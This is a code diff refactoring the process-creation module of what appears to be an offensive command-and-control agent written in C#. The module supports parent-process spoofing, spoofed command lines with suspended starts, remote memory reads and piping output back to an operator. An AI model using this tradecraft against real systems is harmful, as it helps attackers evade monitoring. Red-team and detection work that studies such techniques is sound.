@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Microsoft.Win32.SafeHandles;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -123,22 +123,19 @@ namespace Agent.Utilities
         }
         private Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
         {
-            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
-            Native.RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));
+            int structSize = Marshal.SizeOf(StructObject.GetType());
+            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(structSize);
+            Native.RtlZeroMemory(ObjAllocMemAddr, structSize);
 
             uint getsize = 0;
-            bool return_status = false;
-
-            return_status = Native.NtReadVirtualMemory(
+            _ = Native.NtReadVirtualMemory(
                 Handle,
                 BaseAddress,
                 ObjAllocMemAddr,
-                (uint)Marshal.SizeOf(StructObject),
-                ref getsize
-                );
+                (uint)structSize,
+                ref getsize);
 
-            StructObject = Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
-            return StructObject;
+            return Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
         }
         private bool TryCreateNamedPipe(string task_id, ref Native.SECURITY_ATTRIBUTES saHandles, out IntPtr shStdOutRead, out IntPtr shStdOutWrite)
         {
@@ -202,7 +199,6 @@ namespace Agent.Utilities
                 if (opts.parent > 0)
                 {
                     var dupStdOut = IntPtr.Zero;
-                    var lpValueProc = IntPtr.Zero;
                     if (!AddSpoofParent(opts, ref sInfoEx, ref lpValue, ref hStdOutWrite, ref dupStdOut))
                     {
                         pi = new Native.PROCESS_INFORMATION();
@@ -216,30 +212,22 @@ namespace Agent.Utilities
                 pSec.nLength = Marshal.SizeOf(pSec);
                 tSec.nLength = Marshal.SizeOf(tSec);
 
+                bool hasSpoofedCmd = !string.IsNullOrEmpty(opts.spoofedcommandline);
+                string cmdLine = hasSpoofedCmd ? opts.spoofedcommandline : opts.commandline;
+                messageManager.WriteLine(
+                    hasSpoofedCmd ? $"[Spoofed CommandLine] {cmdLine}" : $"[Real CommandLine] {cmdLine}",
+                    opts.task_id,
+                    false);
 
-                string cmdLine = String.Empty;
-
-                if (string.IsNullOrEmpty(opts.spoofedcommandline))
+                var flags = Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | Native.CreateProcessFlags.CREATE_NEW_CONSOLE;
+                if (opts.suspended || hasSpoofedCmd)
                 {
-                    cmdLine = opts.commandline;
-                    messageManager.WriteLine($"[Real CommandLine] {cmdLine}", opts.task_id, false);
+                    messageManager.WriteLine("Starting Process Suspended", opts.task_id, false);
+                    flags |= Native.CreateProcessFlags.CREATE_SUSPENDED;
                 }
                 else
                 {
-                    cmdLine = opts.spoofedcommandline;
-                    messageManager.WriteLine($"[Spoofed CommandLine] {cmdLine}", opts.task_id, false);
-                }
-
-                Native.CreateProcessFlags flags;
-                if (opts.suspended || !string.IsNullOrEmpty(opts.spoofedcommandline))
-                {
-                    messageManager.WriteLine($"Starting Process Suspended", opts.task_id, false);
-                    flags = Native.CreateProcessFlags.CREATE_SUSPENDED | Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | Native.CreateProcessFlags.CREATE_NEW_CONSOLE;
-                }
-                else
-                {
-                    messageManager.WriteLine($"Starting Process", opts.task_id, false);
-                    flags = Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | Native.CreateProcessFlags.CREATE_NEW_CONSOLE;
+                    messageManager.WriteLine("Starting Process", opts.task_id, false);
                 }
 
                 //To do change this to use spoof command line args
@@ -249,7 +237,6 @@ namespace Agent.Utilities
                 {
                     messageManager.WriteLine($"[Create Process] {Marshal.GetLastPInvokeErrorMessage()}", opts.task_id, true, "error");
                 }
-
             }
             catch
             {
@@ -274,50 +261,40 @@ namespace Agent.Utilities
                 using (SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false))
                 using (var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true))
                 {
-                    StringBuilder outputBuilder = new StringBuilder();
-                    //char[] buf = new char[4096];
-
-                    while (!cts.Token.IsCancellationRequested) // Loop to handle process output
+                    while (!cts.Token.IsCancellationRequested)
                     {
-                        if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) // If the process closed, tell the loop to stop
+                        if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0)
                         {
                             cts.Cancel();
                         }
 
                         uint bytesToRead = 0;
-                        if (Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) // Check if we have bytes to read
+                        if (!Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero))
+                            continue;
+
+                        if (bytesToRead == 0)
                         {
-                            if (bytesToRead == 0) // We don't have any bytes to read
-                            {
-                                if (cts.Token.IsCancellationRequested) // Check if we're supposed to exit
-                                {
-                                    break;
-                                }
-                                else // Process just hasn't written anything yet
-                                {
-                                    continue;
-                                }
-                            }
-                            else if (bytesToRead > 4096) // Limit the buffer size to 4096 to not overwhelm the agent
-                            {
-                                bytesToRead = 4096;
-                            }
+                            if (cts.Token.IsCancellationRequested)
+                                break;
+                            continue;
+                        }
 
-                            try
-                            {
-                                char[] buf = new char[bytesToRead];
-                                int bytesRead = reader.Read(buf, 0, (int)bytesToRead); // Read the char buffer into our previously allocated array
+                        if (bytesToRead > 4096)
+                            bytesToRead = 4096;
 
-                                if (bytesRead > 0) // We read some bytes, let's append it to the StringBuilder
-                                {
-                                    messageManager.Write(new string(buf), task_id, false);
-                                }
-                            }
-                            catch (IOException ex)
+                        try
+                        {
+                            char[] buf = new char[bytesToRead];
+                            int bytesRead = reader.Read(buf, 0, (int)bytesToRead);
+
+                            if (bytesRead > 0)
                             {
-                                // Handle IOException, if needed
-                                messageManager.Write($"Error reading from process output: {ex.Message}", task_id, true, "error");
+                                messageManager.Write(new string(buf), task_id, false);
                             }
+                        }
+                        catch (IOException ex)
+                        {
+                            messageManager.Write($"Error reading from process output: {ex.Message}", task_id, true, "error");
                         }
                     }
                 }
